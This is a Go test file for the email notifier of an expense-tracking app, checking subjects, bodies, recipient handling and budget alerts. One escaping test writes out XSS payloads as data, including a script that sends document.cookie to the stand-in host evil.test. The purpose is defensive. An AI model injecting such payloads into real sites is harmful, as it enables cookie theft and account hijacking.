package notify

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/mlkad/b2b-expense-tracker/internal/domain/expense"
	"github.com/mlkad/b2b-expense-tracker/internal/domain/shared"
)

func testNotifier(t *testing.T) (*Notifier, *RecordingSender) {
	t.Helper()
	rec := &RecordingSender{}
	n, err := New(rec, "https://app.example.com")
	if err != nil {
		t.Fatal(err)
	}
	return n, rec
}

func sampleExpense() ExpenseEvent {
	return ExpenseEvent{
		To:            []Recipient{{Email: "manager@acme.test", Name: "Grace"}},
		TenantName:    "Acme Ltd",
		ExpenseID:     uuid.MustParse("11111111-2222-3333-4444-555555555555"),
		Action:        expense.ActionSubmit,
		Status:        expense.StatusPendingApproval,
		Merchant:      "Figma",
		Amount:        shared.Money{Minor: 12500, Currency: "USD"},
		SpentAt:       time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC),
		SubmitterName: "Ada",
		Revision:      1,
	}
}

func TestExpenseMessageCarriesTheFacts(t *testing.T) {
	n, rec := testNotifier(t)
	if err := n.ExpenseTransition(context.Background(), sampleExpense()); err != nil {
		t.Fatal(err)
	}

	msg, err := rec.Last()
	if err != nil {
		t.Fatal(err)
	}

	// The subject is what a recipient reads before deciding whether to open
	// anything, so it has to carry the organisation, the merchant and the
	// amount.
	for _, want := range []string{"Acme Ltd", "Figma", "125.00"} {
		if !strings.Contains(msg.Subject, want) {
			t.Errorf("subject %q does not mention %q", msg.Subject, want)
		}
	}

	// Both bodies, always. A multipart message with no readable alternative is
	// treated far worse by spam filters than one with.
	if msg.Text == "" || msg.HTML == "" {
		t.Fatal("a message is missing one of its two bodies")
	}
	for _, want := range []string{"Figma", "125.00", "USD", "Ada", "1 March 2026"} {
		if !strings.Contains(msg.Text, want) {
			t.Errorf("the text body does not mention %q:\n%s", want, msg.Text)
		}
	}
	if !strings.Contains(msg.HTML, "https://app.example.com/expenses/11111111-2222-3333-4444-555555555555") {
		t.Error("no link back to the claim")
	}
}

// Every transition gets wording of its own. A generic "a claim changed" tells
// the reader nothing and trains them to ignore the next one.
func TestEveryTransitionHasItsOwnWording(t *testing.T) {
	n, rec := testNotifier(t)

	subjects := map[expense.Action]string{}
	for _, action := range expense.AllActions {
		e := sampleExpense()
		e.Action = action
		e.DecidedByName = "Grace"

		if err := n.ExpenseTransition(context.Background(), e); err != nil {
			t.Fatalf("%s: %v", action, err)
		}
		msg, _ := rec.Last()
		subjects[action] = msg.Subject
	}

	seen := map[string]expense.Action{}
	for action, subject := range subjects {
		if subject == "" {
			t.Errorf("%s produced no subject", action)
		}
		// revise reuses the submit wording only when it is followed by a
		// submit, so a collision between any two distinct actions is a bug.
		if prior, dup := seen[subject]; dup && prior != action {
			t.Errorf("%s and %s produce the identical subject %q", prior, action, subject)
		}
		seen[subject] = action
	}

	if !strings.Contains(subjects[expense.ActionApprove], "approved") {
		t.Errorf("approve subject = %q", subjects[expense.ActionApprove])
	}
	if !strings.Contains(subjects[expense.ActionReject], "rejected") {
		t.Errorf("reject subject = %q", subjects[expense.ActionReject])
	}
	if !strings.Contains(subjects[expense.ActionPay], "paid") {
		t.Errorf("pay subject = %q", subjects[expense.ActionPay])
	}
}

func TestResubmissionSaysItIsARevision(t *testing.T) {
	n, rec := testNotifier(t)

	e := sampleExpense()
	e.Revision = 2
	if err := n.ExpenseTransition(context.Background(), e); err != nil {
		t.Fatal(err)
	}
	msg, _ := rec.Last()

	// An approver looking at revision 2 needs to know there was a decision on
	// revision 1, or they review it as if it were new.
	if !strings.Contains(msg.Subject, "Revised") {
		t.Errorf("subject does not say it is a revision: %q", msg.Subject)
	}
	if !strings.Contains(msg.Text, "Revision:    2") {
		t.Errorf("the body does not show the revision number:\n%s", msg.Text)
	}
}

// Merchant names, decision notes and department names all reach these bodies
// unchanged from the database, and one member of an organisation chooses them.
func TestHTMLBodyEscapesTenantData(t *testing.T) {
	n, rec := testNotifier(t)

	note := `</td><script>fetch('https://evil.test?c='+document.cookie)</script>`
	e := sampleExpense()
	e.Action = expense.ActionReject
	e.Merchant = `<img src=x onerror="alert(1)">`
	e.DecisionNote = &note
	e.SubmitterName = `<b>Ada</b>`

	if err := n.ExpenseTransition(context.Background(), e); err != nil {
		t.Fatal(err)
	}
	msg, _ := rec.Last()

	// What matters is that no new element or attribute was introduced. The
	// string "onerror=" appearing as escaped text inside a text node is
	// harmless and asserting on it would be a false positive - the dangerous
	// thing is a "<" that survived as markup.
	for _, forbidden := range []string{"<script", "<img", "<b>Ada"} {
		if strings.Contains(msg.HTML, forbidden) {
			t.Fatalf("unescaped %q reached the html body; html/template is not doing its job:\n%s",
				forbidden, msg.HTML)
		}
	}

	// Escaped, not dropped: the reader still has to see what the merchant was
	// called, and a silently blanked field hides the very thing that would
	// make somebody suspicious.
	if !strings.Contains(msg.HTML, "&lt;img") {
		t.Errorf("the merchant name vanished rather than being escaped:\n%s", msg.HTML)
	}
	if !strings.Contains(msg.HTML, "&lt;/td&gt;") && !strings.Contains(msg.HTML, "&lt;script") {
		t.Errorf("the decision note was not escaped into the body:\n%s", msg.HTML)
	}

	// The plain-text part needs no escaping - it is not markup - but it must
	// still carry the value, or the two bodies disagree about what happened.
	if !strings.Contains(msg.Text, "onerror") {
		t.Errorf("the text body lost the merchant name:\n%s", msg.Text)
	}
}

func TestRecipientsAreDeduplicatedAndValidated(t *testing.T) {
	n, rec := testNotifier(t)

	e := sampleExpense()
	e.To = []Recipient{
		{Email: "grace@acme.test", Name: "Grace"},
		// The same person is both an owner and the department head.
		{Email: "GRACE@acme.test", Name: "Grace Hopper"},
		{Email: "", Name: "nobody"},
		{Email: "not an address", Name: "broken row"},
		{Email: "ada@acme.test", Name: "Ada"},
	}

	if err := n.ExpenseTransition(context.Background(), e); err != nil {
		t.Fatal(err)
	}
	msg, _ := rec.Last()

	if len(msg.To) != 2 {
		t.Fatalf("sending to %d recipients, want 2 after deduplication and validation: %+v", len(msg.To), msg.To)
	}
	// The address is sent as stored: the local part is technically
	// case-sensitive, and folding it is only safe for the comparison.
	if msg.To[0].Email != "grace@acme.test" {
		t.Errorf("the stored casing was not preserved: %q", msg.To[0].Email)
	}
}

// A claim whose only approver has been suspended has nobody to tell. Failing
// the job would retry that forever.
func TestNoDeliverableRecipientsIsNotAnError(t *testing.T) {
	n, rec := testNotifier(t)

	e := sampleExpense()
	e.To = []Recipient{{Email: "not an address"}}

	if err := n.ExpenseTransition(context.Background(), e); err != nil {
		t.Fatalf("got %v, want the send to be skipped quietly", err)
	}
	if len(rec.Messages) != 0 {
		t.Fatal("a message was sent with no deliverable recipients")
	}
}

func TestBudgetMessage(t *testing.T) {
	n, rec := testNotifier(t)

	e := BudgetEvent{
		To:             []Recipient{{Email: "finance@acme.test", Name: "Finance"}},
		TenantName:     "Acme Ltd",
		DepartmentName: "Engineering",
		Budget:         shared.Money{Minor: 100_000, Currency: "USD"},
		Consumed:       shared.Money{Minor: 85_000, Currency: "USD"},
		Remaining:      shared.Money{Minor: 15_000, Currency: "USD"},
		UsageBps:       8500,
		ThresholdBps:   8000,
		PeriodStart:    time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
		PeriodEnd:      time.Date(2026, 3, 31, 0, 0, 0, 0, time.UTC),
	}
	if err := n.BudgetThreshold(context.Background(), e); err != nil {
		t.Fatal(err)
	}
	msg, _ := rec.Last()

	if !strings.Contains(msg.Subject, "85.0%") {
		t.Errorf("subject does not carry the usage: %q", msg.Subject)
	}
	// The reader has to know that pending claims are excluded, or the figure
	// looks wrong against what they see in the queue.
	if !strings.Contains(msg.Text, "approved and paid") {
		t.Errorf("the body does not say what 'committed' counts:\n%s", msg.Text)
	}

	t.Run("an overspent budget says so rather than reporting 120%%", func(t *testing.T) {
		over := e
		over.Consumed = shared.Money{Minor: 120_000, Currency: "USD"}
		over.Remaining = shared.Money{Minor: -20_000, Currency: "USD"}
		over.UsageBps = 12000

		if err := n.BudgetThreshold(context.Background(), over); err != nil {
			t.Fatal(err)
		}
		msg, _ := rec.Last()
		if !strings.Contains(msg.Subject, "overspent") {
			t.Errorf("subject = %q", msg.Subject)
		}
		if !strings.Contains(msg.Text, "-200.00") {
			t.Errorf("the remaining figure is not shown as negative:\n%s", msg.Text)
		}
	})
}

func TestNewRefusesAMissingSender(t *testing.T) {
	if _, err := New(nil, ""); err == nil {
		t.Fatal("a notifier with no sender was accepted")
	}
}

// An empty dashboard URL omits links rather than producing "/expenses/..."
// which resolves to nothing in a mail client.
func TestNoDashboardURLOmitsLinks(t *testing.T) {
	rec := &RecordingSender{}
	n, err := New(rec, "")
	if err != nil {
		t.Fatal(err)
	}
	if err := n.ExpenseTransition(context.Background(), sampleExpense()); err != nil {
		t.Fatal(err)
	}
	msg, _ := rec.Last()

	if strings.Contains(msg.HTML, `href="/expenses`) || strings.Contains(msg.Text, "http") {
		t.Errorf("a relative or empty link was rendered:\n%s", msg.Text)
	}
}
